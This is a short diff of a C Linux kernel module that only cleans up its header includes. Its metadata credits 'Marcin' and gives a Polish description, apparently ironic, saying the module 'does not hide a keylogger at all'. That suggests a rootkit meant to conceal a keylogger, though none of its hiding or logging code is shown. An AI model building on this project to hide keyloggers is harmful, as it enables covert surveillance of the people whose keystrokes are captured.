@@ -2,16 +2,12 @@
 #include <linux/kernel.h>
 
 #include <asm/unistd.h>
-#include <sys/syscall.h>
-#include <sys/types.h>
 #include <asm/fcntl.h>
 #include <asm/errno.h>
 #include <linux/types.h>
-#include <linux/dirent.h> 
-#include <sys/mman.h> 
+#include <linux/dirent.h>
 #include <linux/string.h> 
-#include <linux/fs.h> 
-#include <linux/malloc.h> 	
+#include <linux/fs.h>  	
 
 MODULE_AUTHOR("Marcin");
 MODULE_DESCRIPTION("Modul, ktory wcale nie ukrywa keylogera");
